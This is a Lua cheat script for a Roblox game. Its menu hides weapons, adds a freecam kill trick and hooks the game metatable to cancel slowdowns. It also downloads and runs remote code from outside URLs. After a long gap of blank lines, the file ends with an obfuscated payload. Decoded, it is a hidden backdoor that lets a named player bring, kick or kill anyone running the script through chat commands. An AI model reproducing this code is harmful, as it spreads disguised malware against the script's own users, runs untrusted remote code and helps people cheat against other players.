local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
	Name = "KarpiWare Reborn 2",
	LoadingTitle = "Loading",
	LoadingSubtitle = "by brady",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "Karpi",
		FileName = "KarpiWare"
	},
	KeySystem = false,
	KeySettings = {
		Title = "KarpiWare",
		Subtitle = "Key System",
		Note = "key is in discord",
		SaveKey = true,
		Key = "Karpi_Reborn221"
	}
})

local Tab = Window:CreateTab("Main") -- Title, Image
local Tab2 = Window:CreateTab("Other")

local Section = Tab:CreateSection("Main")
local Section1 = Tab2:CreateSection("Other")

local Toggle111345 = Tab:CreateToggle({
	Name = "Invisible Bat [BELOW MAP FULL INVIS]",
	CurrentValue = false,
	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
    Rayfield:Notify("KarpiWare Reborn", "Executed Script!", 13918598163)
    if Value == true then
local PPname = "[Bat]"
local PPlocation = game.Players.LocalPlayer.Character:WaitForChild(PPname)
PPlocation.GripPos = Vector3.new(-100,-100,0)
elseif Value == false then
    local PPname = "[Bat]"
local PPlocation = game.Players.LocalPlayer.Character:WaitForChild(PPname)
PPlocation.GripPos = Vector3.new(0,-1,0)
end

	end,
})

local Toggle5134 = Tab:CreateToggle({
	Name = "Invisible StopSign [BELOW MAP FULL INVIS]",
	CurrentValue = false,
	Flag = "Toggle5", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
    Rayfield:Notify("KarpiWare Reborn", "Executed Script!", 13918598163)
    if Value == true then
local PPname = "[StopSign]"
local PPlocation = game.Players.LocalPlayer.Character:WaitForChild(PPname)
PPlocation.GripPos = Vector3.new(-100,-100,0)
elseif Value == false then
    local PPname = "[StopSign]"
local PPlocation = game.Players.LocalPlayer.Character:WaitForChild(PPname)
PPlocation.GripPos = Vector3.new(0,-1,0)
end

	end,
})

local Toggle21122 = Tab:CreateToggle({
	Name = "Invisible DBshotgun [ABOVE MAP SEMI INVIS]",
	CurrentValue = false,
	Flag = "Toggle2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
    Rayfield:Notify("KarpiWare Reborn", "Executed Script!", 13918598163)
    if Value == true then
local PPname = "[Double-Barrel SG]"
local PPlocation = game.Players.LocalPlayer.Character:WaitForChild(PPname)
PPlocation.GripPos = Vector3.new(0,-50,0)
elseif Value == false then
    local PPname = "[Double-Barrel SG]"
local PPlocation = game.Players.LocalPlayer.Character:WaitForChild(PPname)
PPlocation.GripPos = Vector3.new(0,-0.5,0)
end

	end,
})

local Toggle22242 = Tab:CreateToggle({
	Name = "Invisible Revolver [ABOVE MAP SEMI INVIS]",
	CurrentValue = false,
	Flag = "Toggle2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
    Rayfield:Notify("KarpiWare Reborn", "Executed Script!", 13918598163)
    if Value == true then
local PPname = "[Revolver]"
local PPlocation = game.Players.LocalPlayer.Character:WaitForChild(PPname)
PPlocation.GripPos = Vector3.new(0,-15,0)
elseif Value == false then
    local PPname = "[Revolver]"
local PPlocation = game.Players.LocalPlayer.Character:WaitForChild(PPname)
PPlocation.GripPos = Vector3.new(0,-0.5,0)
end

	end,
})

local Button9234 = Tab:CreateButton({
	Name = "OP kill feature (C to freecam) [ENABLE INVIS GUN, ONLY WORKS AROUND BANK AREA]",
	Callback = function()
        Rayfield:Notify("KarpiWare Reborn", "Executed Script!", 13918598163)

NewPart = Instance.new("Part")
NewPart.Parent = Workspace
NewPart.Size = Vector3.new(200,5,200)
NewPart.Anchored = true
NewPart.CFrame = CFrame.new(-378.2826232910156,2.3899288177490234,-285.43780517578125)
print(NewPart.CFrame.X)
print(NewPart.CFrame.Y)
print(NewPart.CFrame.Z)

local plr1 = game.Players.LocalPlayer.Character
plr1.HumanoidRootPart.CFrame = NewPart.CFrame

ToggleKey = Enum.KeyCode.C
SprintKey = Enum.KeyCode.Tab

localPlayer = game.Players.LocalPlayer

Camera = game.Workspace.CurrentCamera
Mouse = localPlayer:GetMouse()

UserInputService = game:GetService("UserInputService")


movePosition = Vector2.new(0,0)
moveDirection = Vector3.new(0,0,0)

targetMovePosition = movePosition

Y_Sensitivity = 300;
X_Sensitivity = 300;

lastRightButtonDown = Vector2.new(0,0)
rightMouseButtonDown = false

targetFOV = 70

sprinting = false;
sprintingSpeed = 6;

keysDown = {}

moveKeys = {
[Enum.KeyCode.D] = Vector3.new(1,0,0),
[Enum.KeyCode.A] = Vector3.new(-1,0,0),
[Enum.KeyCode.S] = Vector3.new(0,0,1),
[Enum.KeyCode.W] = Vector3.new(0,0,-1),
[Enum.KeyCode.E] = Vector3.new(0,1,0),
[Enum.KeyCode.Q] = Vector3.new(0,-1,0)
}

Tween = function(a,b,t)
if t == 1 then
return b
else 
if tonumber(a) then
    return a * (1-t) + (b*t)
else
return a:Lerp(b,t);
end
end
end

ClampVector3 = function(x,min,max)

return 
Vector3.new(
math.clamp(x.X,min.X,max.X),
math.clamp(x.Y,min.Y,max.Y),
math.clamp(x.Z,min.Z,max.Z)
)

end


UserInputService.InputChanged:connect(function(inputObject)
if inputObject.UserInputType == Enum.UserInputType.MouseMovement then
movePosition = movePosition + Vector2.new(inputObject.Delta.x,inputObject.Delta.y)
end
end)

CalculateMovement = function()
local newMovement = Vector3.new(0,0,0)
for i,v in pairs(keysDown) do
newMovement = newMovement + (moveKeys[i] or Vector3.new(0,0,0))
end
return newMovement
end

Round = function(num, numDecimalPlaces)
  return math.floor((num/numDecimalPlaces) + .5)*numDecimalPlaces
end

Input = function(input,gameProcessed)
if moveKeys[input.KeyCode] then
if input.UserInputState == Enum.UserInputState.Begin then
keysDown[input.KeyCode] = true
elseif input.UserInputState == Enum.UserInputState.End then
keysDown[input.KeyCode] = nil
end
else
if input.UserInputState == Enum.UserInputState.Begin then
print(input.KeyCode)
if input.UserInputType == Enum.UserInputType.MouseButton2 then
rightMouseButtonDown = true
lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
elseif input.KeyCode == Enum.KeyCode.Z then
targetFOV = 20
elseif input.KeyCode == SprintKey then
sprinting = true
end
else
if input.UserInputType == Enum.UserInputType.MouseButton2 then
rightMouseButtonDown = false
UserInputService.MouseBehavior = Enum.MouseBehavior.Default
elseif input.KeyCode == Enum.KeyCode.Z then
targetFOV = 70
elseif input.KeyCode == SprintKey then
sprinting = false
end
end
end
end
 
Mouse.WheelForward:connect(function()
   Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(0,0,-5)
end)

Mouse.WheelBackward:connect(function()
   Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(-0,0,5)
end)

UserInputService.InputBegan:connect(Input)
UserInputService.InputEnded:connect(Input)

local Toggled = false
game:GetService("UserInputService").InputBegan:connect(function(inputObject)
if inputObject.KeyCode == ToggleKey then
Toggled = not Toggled
if Toggled then
Camera.CameraType = Enum.CameraType.Scriptable
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true 
else
game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
game.Workspace.CurrentCamera.CameraType = "Custom"
end
end
end)


game:GetService("RunService").RenderStepped:Connect(function()
if Toggled then
local mouseTarget = Mouse.Hit

targetMovePosition = movePosition
Camera.CoordinateFrame = CFrame.new(Camera.CoordinateFrame.p) * CFrame.fromEulerAnglesYXZ(-targetMovePosition.Y/Y_Sensitivity ,-targetMovePosition.X/X_Sensitivity, 0) * CFrame.new(CalculateMovement() * ((({[true]=sprintingSpeed})[sprinting]) or .5) )
Camera.FieldOfView = Tween(Camera.FieldOfView,targetFOV,.5)
if rightMouseButtonDown then
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
movePosition = movePosition - (lastRightButtonDown - Vector2.new(Mouse.X,Mouse.Y))
lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
end
end
end)


	end,
})

local Button9234 = Tab:CreateButton({
	Name = "SuperSword V2 (need bat and stopsign)",
	Callback = function()
        Rayfield:Notify("KarpiWare Reborn", "Executed Script!", 13918598163)

    local PPname = "[Bat]"
    local PPname2 = "[StopSign]"

local plr = game:GetService'Players'.LocalPlayer
plr.Backpack[PPname].Parent = plr.Character
plr.Backpack[PPname2].Parent = plr.Character

local PPlocation2 = game.Players.LocalPlayer.Character:WaitForChild(PPname2)
PPlocation2.GripPos = Vector3.new(6,-0.1,0)

local PPlocation = game.Players.LocalPlayer.Character:WaitForChild(PPname)
PPlocation.GripPos = Vector3.new(0,-1,0)

	end,
})

local Button1345 = Tab:CreateButton({
	Name = "AntiSlow",
	Callback = function()
        Rayfield:Notify("KarpiWare Reborn", "Executed Script!", 13918598163)
local mt = getrawmetatable(game)
local backup
backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
if key == "WalkSpeed" and value < 16 then
value = 16
end
return backup(self, key, value)
end))
	end,
})


local ButtonDestroy = Tab:CreateButton({
	Name = "Destroy UI",
	Callback = function()
		Rayfield:Destroy()
	end,
})

local Button34535 = Tab2:CreateButton({
	Name = "KarpiWare V3 [Wont get anymore updates]",
	Callback = function()
        Rayfield:Notify("KarpiWare Reborn", "Executed Script!", 13918598163)
loadstring(game:HttpGet(('https://raw.githubusercontent.com/arandomuserlmao/KarpiWare/main/Intro'),true))()  
	end,
})

























do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v71=0;local v72;while true do if (v71==0) then v72=v2(v0(v30,16));if v19 then local v99=0;local v100;while true do if (v99==1) then return v100;end if (v99==0) then v100=v5(v72,v19);v19=nil;v99=1;end end else return v72;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v73=0 -0 ;local v74;while true do if (v73==((957 -(892 + 65)) -0)) then v74=(v31/((3 -1)^(v32-(2 -(1 + 0)))))%(2^(((v33-(620 -(555 + 64))) -(v32-(1 -0))) + ((2542 -1476) -(68 + 997)))) ;return v74-(v74%(1271 -(226 + 1044))) ;end end else local v75=((1724 -791) -(857 + (135 -61)))^(v32-(569 -(367 + 201))) ;return (((v31%(v75 + v75))>=v75) and (118 -(32 + 85))) or ((1277 -(87 + 263)) -((394 -(67 + 113)) + 713)) ;end end local function v21()local v34=0 + 0 ;local v35;while true do if (v34==((5 -3) -1)) then return v35;end if (v34==(0 + (0 -0))) then v35=v1(v16,v18,v18);v18=v18 + (3 -2) ;v34=953 -(802 + 150) ;end end end local function v22()local v36=0 + 0 ;local v37;local v38;while true do if (v36==(998 -(915 + 82))) then return (v38 * (724 -468)) + v37 ;end if (v36==0) then v37,v38=v1(v16,v18,v18 + (1189 -(1069 + 118)) + 0 );v18=v18 + (2 -0) ;v36=2 -1 ;end end end local function v23()local v39=0 -0 ;local v40;local v41;local v42;local v43;while true do if (v39==(3 -2)) then return (v43 * (16777234 -(10 + 8))) + (v42 * 65536) + (v41 * (45 + 211)) + v40 ;end if (0==v39) then v40,v41,v42,v43=v1(v16,v18,v18 + (4 -1) );v18=v18 + 4 + 0 ;v39=3 -(1 + 1) ;end end end local function v24()local v44=0 -0 ;local v45;local v46;local v47;local v48;local v49;local v50;while true do if (v44==(1 + 0)) then v47=439 -(145 + (1473 -(1123 + 57))) ;v48=(v20(v46,(351 + 80) -(44 + 386) ,1506 -(998 + 488) ) * ((1 + 1)^32)) + v45 ;v44=2 + 0 ;end if ((775 -(201 + 571))==v44) then if (v49==((1392 -(163 + 91)) -(116 + 1022))) then if (v48==(0 -0)) then return v50 * (0 -0) ;else v49=1 + 0 ;v47=0 -0 ;end elseif (v49==(17 + 2030)) then return ((v48==(0 + 0)) and (v50 * ((3 -2)/(859 -(814 + 45))))) or (v50 * NaN) ;end return v8(v50,v49-(929 + 94) ) * (v47 + (v48/((4 -(16 -(9 + 5)))^(3 + 49)))) ;end if (v44==(1413 -(447 + 966))) then v45=v23();v46=v23();v44=1;end if (v44==(1 + (1931 -(1869 + 61)))) then v49=v20(v46,1838 -(1703 + 32 + 82) ,(1292 -(85 + 291)) -((1526 -(243 + 1022)) + 624) );v50=((v20(v46,(196 -140) -(91 -67) )==(1081 -((1566 -546) + 60))) and  -(1424 -(630 + 793))) or ((3 + 0) -2) ;v44=14 -11 ;end end end local function v25(v51)local v52;if  not v51 then v51=v23();if (v51==(0 + 0)) then return "";end end v52=v3(v16,v18,(v18 + v51) -(1 -0) );v18=v18 + v51 ;local v53={};for v69=1 + 0 , #v52 do v53[v69]=v2(v1(v3(v52,v69,v69)));end return v6(v53);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v54=0;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v54==1) then local v76=1271 -(945 + 326) ;while true do if (0==v76) then v57=nil;v58=nil;v76=2 -1 ;end if (v76~=1) then else v54=2;break;end end end if (v54==0) then local v77=0 + 0 ;while true do if (v77~=0) then else v55=0;v56=nil;v77=1;end if (v77==(701 -(271 + 429))) then v54=1 + 0 ;break;end end end if (v54~=2) then else v59=nil;v60=nil;v54=3;end if (v54==3) then v61=nil;while true do local v81=0;while true do if (v81==(1501 -(1408 + 92))) then if (v55==(1088 -(461 + 625))) then for v107=1,v23() do local v108=1288 -(993 + 295) ;local v109;local v110;while true do if (v108==0) then v109=0 + 0 ;v110=nil;v108=1172 -(418 + 753) ;end if (1~=v108) then else while true do if (v109==(0 + 0)) then v110=v21();if (v20(v110,1 + 0 ,1)==0) then local v238=0 + 0 ;local v239;local v240;local v241;local v242;while true do if (v238~=0) then else v239=0 + 0 ;v240=nil;v238=530 -(406 + 123) ;end if (1~=v238) then else v241=nil;v242=nil;v238=1771 -(1749 + 20) ;end if (v238~=(1 + 1)) then else while true do if (v239==3) then if (v20(v241,1325 -(1249 + 73) ,3)~=1) then else v242[4]=v61[v242[2 + 2 ]];end v56[v107]=v242;break;end if ((1147 -(466 + 679))==v239) then local v314=0 -0 ;while true do if (v314~=1) then else v239=8 -5 ;break;end if (v314==(1900 -(106 + 1794))) then if (v20(v241,1 + 0 ,1)==1) then v242[1 + 1 ]=v61[v242[2]];end if (v20(v241,5 -3 ,2)==(2 -1)) then v242[3]=v61[v242[117 -(4 + 110) ]];end v314=585 -(57 + 527) ;end end end if ((1428 -(41 + 1386))==v239) then local v315=103 -(17 + 86) ;while true do if ((1 + 0)~=v315) then else v239=2;break;end if (v315==(0 -0)) then v242={v22(),v22(),nil,nil};if (v240==(0 -0)) then local v332=0;local v333;local v334;local v335;while true do if (v332==1) then v335=nil;while true do if (v333==0) then local v339=0 -0 ;while true do if (v339==1) then v333=1;break;end if (v339~=0) then else v334=0 + 0 ;v335=nil;v339=1;end end end if (v333==(1 + 0)) then while true do if (v334~=0) then else v335=0 -0 ;while true do if (v335~=(65 -(30 + 35))) then else v242[3 + 0 ]=v22();v242[4]=v22();break;end end break;end end break;end end break;end if (v332~=(1257 -(1043 + 214))) then else v333=0 -0 ;v334=nil;v332=1213 -(323 + 889) ;end end elseif (v240==(2 -1)) then v242[583 -(361 + 219) ]=v23();elseif (v240==2) then v242[323 -(53 + 267) ]=v23() -(2^(4 + 12)) ;elseif (v240==(416 -(15 + 398))) then local v340=982 -(18 + 964) ;local v341;local v342;while true do if (0==v340) then v341=0 -0 ;v342=nil;v340=1 + 0 ;end if (v340==1) then while true do if (0~=v341) then else v342=0;while true do if ((0 + 0)~=v342) then else v242[3]=v23() -(2^(866 -(20 + 830))) ;v242[4 + 0 ]=v22();break;end end break;end end break;end end end v315=1;end end end if (v239==(126 -(116 + 10))) then local v316=0;local v317;while true do if (v316==(0 + 0)) then v317=738 -(542 + 196) ;while true do if (v317==0) then local v336=0 -0 ;while true do if (v336~=1) then else v317=1 + 0 ;break;end if ((0 + 0)~=v336) then else v240=v20(v110,1 + 1 ,7 -4 );v241=v20(v110,9 -5 ,6);v336=1552 -(1126 + 425) ;end end end if (v317==(406 -(118 + 287))) then v239=1;break;end end break;end end end end break;end end end break;end end break;end end end for v111=3 -2 ,v23() do v57[v111-(1122 -(118 + 1003)) ]=v28();end return v59;end break;end if (v81==(0 -0)) then if (v55~=1) then else local v105=377 -(142 + 235) ;while true do if (1==v105) then local v113=0;while true do if (v113~=(0 -0)) then else for v154=1 + 0 ,v60 do local v155=977 -(553 + 424) ;local v156;local v157;local v158;while true do if (v155==0) then v156=0;v157=nil;v155=1;end if (v155~=1) then else v158=nil;while true do if (v156==(0 -0)) then local v303=0 + 0 ;while true do if (v303==0) then v157=v21();v158=nil;v303=1;end if (v303==1) then v156=1;break;end end end if (v156==(1 + 0)) then if (v157==(1 + 0)) then v158=v21()~=(0 + 0) ;elseif (v157==2) then v158=v24();elseif (v157==(2 + 1)) then v158=v25();end v61[v154]=v158;break;end end break;end end end v59[3]=v21();v113=1;end if (v113==(2 -1)) then v105=5 -3 ;break;end end end if (v105==(4 -2)) then v55=2;break;end if (v105==(0 + 0)) then local v114=0;while true do if (v114~=1) then else v105=4 -3 ;break;end if (v114==(753 -(239 + 514))) then v60=v23();v61={};v114=1 + 0 ;end end end end end if (v55==0) then local v106=1329 -(797 + 532) ;while true do if (v106==1) then v58={};v59={v56,v57,nil,v58};v106=1 + 1 ;end if (v106~=(0 -0)) then else v56={};v57={};v106=1;end if (v106==2) then v55=1203 -(373 + 829) ;break;end end end v81=1;end end end break;end end end local function v29(v62,v63,v64)local v65=0;local v66;local v67;local v68;while true do if (v65==1) then v68=v62[3];return function(...)local v82=v66;local v83=v67;local v84=v68;local v85=v27;local v86=1;local v87= -1;local v88={};local v89={...};local v90=v12("#",...) -1 ;local v91={};local v92={};for v96=0,v90 do if (v96>=v84) then v88[v96-v84 ]=v89[v96 + 1 ];else v92[v96]=v89[v96 + 1 ];end end local v93=(v90-v84) + 1 ;local v94;local v95;while true do v94=v82[v86];v95=v94[1];if (v95<=21) then if (v95<=10) then if (v95<=4) then if (v95<=1) then if (v95==0) then v92[v94[2]]=v63[v94[3]];else local v118=0;local v119;local v120;local v121;while true do if (v118==0) then v119=v94[2];v120={v92[v119](v13(v92,v119 + 1 ,v87))};v118=1;end if (v118==1) then v121=0;for v260=v119,v94[4] do local v261=0;while true do if (v261==0) then v121=v121 + 1 ;v92[v260]=v120[v121];break;end end end break;end end end elseif (v95<=2) then local v122=0;local v123;while true do if (v122==0) then v123=v94[2];v92[v123](v13(v92,v123 + 1 ,v94[3]));break;end end elseif (v95>3) then local v180=v94[3];local v181=v92[v180];for v245=v180 + 1 ,v94[4] do v181=v181   .. v92[v245] ;end v92[v94[2]]=v181;else local v183=v94[2];local v184,v185=v85(v92[v183](v92[v183 + 1 ]));v87=(v185 + v183) -1 ;local v186=0;for v246=v183,v87 do v186=v186 + 1 ;v92[v246]=v184[v186];end end elseif (v95<=7) then if (v95<=5) then local v124=v94[2];v92[v124]=v92[v124](v13(v92,v124 + 1 ,v94[3]));elseif (v95>6) then v92[v94[2]]=v94[3];else v92[v94[2]]=v92[v94[3]][v94[4]];end elseif (v95<=8) then local v126=0;local v127;while true do if (v126==0) then v127=v94[2];v92[v127](v13(v92,v127 + 1 ,v94[3]));break;end end elseif (v95>9) then v92[v94[2]]=v63[v94[3]];else v92[v94[2]]=v92[v94[3]][v94[4]];end elseif (v95<=15) then if (v95<=12) then if (v95>11) then local v128=v94[2];local v129,v130=v85(v92[v128](v92[v128 + 1 ]));v87=(v130 + v128) -1 ;local v131=0;for v159=v128,v87 do v131=v131 + 1 ;v92[v159]=v129[v131];end else local v132=v94[2];local v133=v94[4];local v134=v132 + 2 ;local v135={v92[v132](v92[v132 + 1 ],v92[v134])};for v162=1,v133 do v92[v134 + v162 ]=v135[v162];end local v136=v135[1];if v136 then local v195=0;while true do if (v195==0) then v92[v134]=v136;v86=v94[3];break;end end else v86=v86 + 1 ;end end elseif (v95<=13) then if (v92[v94[2]]==v94[4]) then v86=v86 + 1 ;else v86=v94[3];end elseif (v95>14) then local v197=0;local v198;local v199;while true do if (v197==0) then v198=v94[2];v199={};v197=1;end if (v197==1) then for v285=1, #v91 do local v286=v91[v285];for v307=0, #v286 do local v308=v286[v307];local v309=v308[1];local v310=v308[2];if ((v309==v92) and (v310>=v198)) then v199[v310]=v309[v310];v308[1]=v199;end end end break;end end else do return;end end elseif (v95<=18) then if (v95<=16) then local v137=v83[v94[3]];local v138;local v139={};v138=v10({},{__index=function(v165,v166)local v167=v139[v166];return v167[1][v167[2]];end,__newindex=function(v168,v169,v170)local v171=0;local v172;while true do if (0==v171) then v172=v139[v169];v172[1][v172[2]]=v170;break;end end end});for v173=1,v94[4] do v86=v86 + 1 ;local v174=v82[v86];if (v174[1]==36) then v139[v173-1 ]={v92,v174[3]};else v139[v173-1 ]={v63,v174[3]};end v91[ #v91 + 1 ]=v139;end v92[v94[2]]=v29(v137,v138,v64);elseif (v95>17) then local v200=0;local v201;local v202;local v203;while true do if (v200==2) then for v287=1,v94[4] do local v288=0;local v289;while true do if (v288==1) then if (v289[1]==36) then v203[v287-1 ]={v92,v289[3]};else v203[v287-1 ]={v63,v289[3]};end v91[ #v91 + 1 ]=v203;break;end if (v288==0) then v86=v86 + 1 ;v289=v82[v86];v288=1;end end end v92[v94[2]]=v29(v201,v202,v64);break;end if (v200==0) then v201=v83[v94[3]];v202=nil;v200=1;end if (v200==1) then v203={};v202=v10({},{__index=function(v290,v291)local v292=0;local v293;while true do if (v292==0) then v293=v203[v291];return v293[1][v293[2]];end end end,__newindex=function(v294,v295,v296)local v297=v203[v295];v297[1][v297[2]]=v296;end});v200=2;end end else v92[v94[2]][v94[3]]=v94[4];end elseif (v95<=19) then v92[v94[2]]=v92[v94[3]] * v92[v94[4]] ;elseif (v95==20) then local v206=0;local v207;while true do if (v206==0) then v207=v94[2];v92[v207]=v92[v207](v13(v92,v207 + 1 ,v94[3]));break;end end else local v208=v94[2];local v209=v94[4];local v210=v208 + 2 ;local v211={v92[v208](v92[v208 + 1 ],v92[v210])};for v252=1,v209 do v92[v210 + v252 ]=v211[v252];end local v212=v211[1];if v212 then local v264=0;while true do if (v264==0) then v92[v210]=v212;v86=v94[3];break;end end else v86=v86 + 1 ;end end elseif (v95<=32) then if (v95<=26) then if (v95<=23) then if (v95==22) then for v176=v94[2],v94[3] do v92[v176]=nil;end else v92[v94[2]]=v94[3];end elseif (v95<=24) then if (v92[v94[2]]==v92[v94[4]]) then v86=v86 + 1 ;else v86=v94[3];end elseif (v95==25) then v86=v94[3];else local v215=v94[2];local v216={};for v255=1, #v91 do local v256=v91[v255];for v265=0, #v256 do local v266=v256[v265];local v267=v266[1];local v268=v266[2];if ((v267==v92) and (v268>=v215)) then v216[v268]=v267[v268];v266[1]=v216;end end end end elseif (v95<=29) then if (v95<=27) then v92[v94[2]][v94[3]]=v92[v94[4]];elseif (v95>28) then if (v92[v94[2]]==v94[4]) then v86=v86 + 1 ;else v86=v94[3];end else v86=v94[3];end elseif (v95<=30) then v92[v94[2]][v94[3]]=v92[v94[4]];elseif (v95>31) then v92[v94[2]]=v92[v94[3]] * v92[v94[4]] ;else local v219=0;local v220;local v221;while true do if (1==v219) then for v302=v220 + 1 ,v94[4] do v221=v221   .. v92[v302] ;end v92[v94[2]]=v221;break;end if (v219==0) then v220=v94[3];v221=v92[v220];v219=1;end end end elseif (v95<=37) then if (v95<=34) then if (v95==33) then v92[v94[2]]=v64[v94[3]];else v92[v94[2]][v94[3]]=v94[4];end elseif (v95<=35) then if (v92[v94[2]]==v92[v94[4]]) then v86=v86 + 1 ;else v86=v94[3];end elseif (v95==36) then v92[v94[2]]=v92[v94[3]];else v92[v94[2]]=v64[v94[3]];end elseif (v95<=40) then if (v95<=38) then v92[v94[2]]=v92[v94[3]];elseif (v95==39) then local v227=v94[2];local v228=v92[v94[3]];v92[v227 + 1 ]=v228;v92[v227]=v228[v94[4]];else local v232=v94[2];local v233={v92[v232](v13(v92,v232 + 1 ,v87))};local v234=0;for v257=v232,v94[4] do v234=v234 + 1 ;v92[v257]=v233[v234];end end elseif (v95<=41) then for v178=v94[2],v94[3] do v92[v178]=nil;end elseif (v95==42) then do return;end else local v235=0;local v236;local v237;while true do if (v235==1) then v92[v236 + 1 ]=v237;v92[v236]=v237[v94[4]];break;end if (v235==0) then v236=v94[2];v237=v92[v94[3]];v235=1;end end end v86=v86 + 1 ;end end;end if (v65==0) then v66=v62[1];v67=v62[2];v65=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!0C3O0003043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203073O00416B616E657A69030C3O0057616974466F724368696C6403053O007061697273030A3O0047657453657276696365030A3O00476574506C6179657273028O00026O00F03F03073O004368612O74656403073O00436F2O6E656374004B3O0012213O00013O0020065O00020020065O0003001207000100043O001221000200013O0020060002000200020020270002000200052O0026000400014O0014000200040002001221000300063O001221000400013O002027000400040007001207000600024O00140004000600020020270004000400082O000C000400054O002800033O00050004193O00470001001207000800094O0016000900093O00260D00080014000100090004193O00140001001207000900093O00260D0009002A0001000A0004193O002A0001002006000A0007000B002027000A000A000C000610000C3O000100042O00243O00074O00243O00014O00248O00243O00024O0008000A000C0001002006000A0007000B002027000A000A000C000610000C0001000100042O00243O00074O00243O00014O00248O00243O00024O0008000A000C00010004193O0046000100260D00090017000100090004193O00170001001207000A00093O00260D000A003E000100090004193O003E0001002006000B0007000B002027000B000B000C000610000D0002000100032O00243O00074O00243O00014O00248O0008000B000D0001002006000B0007000B002027000B000B000C000610000D0003000100032O00243O00074O00243O00014O00248O0008000B000D0001001207000A000A3O00260D000A002D0001000A0004193O002D00010012070009000A3O0004193O001700010004193O002D00010004193O001700010004193O004600010004193O001400012O000F00065O00060B00030012000100020004193O001200012O000F8O002A3O00013O00043O00093O0003043O004E616D65030B3O003B6272696E67757365727303093O0043686172616374657203103O0048756D616E6F6964522O6F745061727403063O00434672616D652O033O006E6577028O00026O00F03F027O004001176O00015O0020060001000100014O000200013O00062300010016000100020004193O0016000100260D3O0016000100020004193O001600014O000100023O0020060001000100030020060001000100044O000200033O002006000200020003002006000200020004002006000200020005001221000300053O002006000300030006001207000400073O001207000500083O001207000600094O00140003000600022O001300020002000300101B0001000500022O002A3O00017O00093O0003043O004E616D6503073O003B6272696E672003093O0043686172616374657203103O0048756D616E6F6964522O6F745061727403063O00434672616D652O033O006E6577028O00026O00F03F027O0040011B6O00015O0020060001000100014O000200013O0006230001001A000100020004193O001A0001001207000100026O000200023O0020060002000200012O00040001000100020006233O001A000100010004193O001A00014O000100023O0020060001000100030020060001000100044O000200033O002006000200020003002006000200020004002006000200020005001221000300053O002006000300030006001207000400073O001207000500083O001207000600094O00140003000600022O001300020002000300101B0001000500022O002A3O00017O00043O0003043O004E616D6503053O003B62616E2003043O004B69636B030A3O004B69636B65642062792001126O00015O0020060001000100014O000200013O00062300010011000100020004193O00110001001207000100026O000200023O0020060002000200012O00040001000100020006233O0011000100010004193O001100014O000100023O002027000100010003001207000300046O000400014O00040003000300042O00080001000300012O002A3O00017O00063O0003043O004E616D6503063O003B6B692O6C2003093O0043686172616374657203083O0048756D616E6F696403063O004865616C7468028O0001106O00015O0020060001000100014O000200013O0006230001000F000100020004193O000F0001001207000100026O000200023O0020060002000200012O00040001000100020006233O000F000100010004193O000F00014O000100023O0020060001000100030020060001000100040030220001000500062O002A3O00017O00",v9(),...);end
